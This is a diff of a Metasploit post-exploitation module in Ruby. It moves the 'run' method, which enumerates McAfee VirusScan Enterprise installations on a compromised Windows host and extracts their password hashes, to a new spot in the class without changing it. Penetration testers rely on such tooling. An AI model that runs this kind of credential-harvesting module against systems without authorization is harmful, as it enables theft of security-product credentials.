@@ -39,6 +39,23 @@ class Metasploit3 < Msf::Post
     ))
   end
 
+  def run
+    print_status("Looking for McAfee password hashes on #{sysinfo['Computer']} ...")
+
+    vse_keys = enum_vse_keys
+    if vse_keys.empty?
+      vprint_error("McAfee Virus Scan Enterprise not installed or insufficient permissions")
+      return
+    end
+
+    hashes_and_versions = extract_hashes_and_versions(vse_keys)
+    if hashes_and_versions.empty?
+      vprint_error("No hashes extracted")
+      return
+    end
+    process_hashes_and_versions(hashes_and_versions)
+  end
+
   def enum_vse_keys
     vprint_status('Enumerating McAfee VSE installations')
     keys = []
@@ -126,20 +143,4 @@ class Metasploit3 < Msf::Post
     end
   end
 
-  def run
-    print_status("Looking for McAfee password hashes on #{sysinfo['Computer']} ...")
-
-    vse_keys = enum_vse_keys
-    if vse_keys.empty?
-      vprint_error("McAfee Virus Scan Enterprise not installed or insufficient permissions")
-      return
-    end
-
-    hashes_and_versions = extract_hashes_and_versions(vse_keys)
-    if hashes_and_versions.empty?
-      vprint_error("No hashes extracted")
-      return
-    end
-    process_hashes_and_versions(hashes_and_versions)
-  end
 end
